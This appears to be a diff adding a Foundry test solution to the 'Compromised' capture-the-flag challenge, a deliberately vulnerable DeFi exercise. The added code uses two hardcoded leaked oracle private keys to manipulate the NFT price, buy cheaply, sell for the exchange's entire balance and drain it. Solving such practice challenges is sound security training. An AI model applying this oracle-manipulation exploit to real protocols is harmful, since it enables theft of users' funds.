@@ -75,7 +75,36 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // 돌파구: 오라클 검증자 개인키 유출됨(??)
+        uint256 sourceKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 sourceKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
         
+        address source1 = vm.addr(sourceKey1);
+        address source2 = vm.addr(sourceKey2);
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 1);
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 1);
+
+        vm.startPrank(player);
+        uint256 myNFT = exchange.buyOne{ value: 1 }();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", address(exchange).balance);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), myNFT);
+        exchange.sellOne(myNFT);
+
+        recovery.call{ value: EXCHANGE_INITIAL_ETH_BALANCE }("");
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
     }
 
     /**
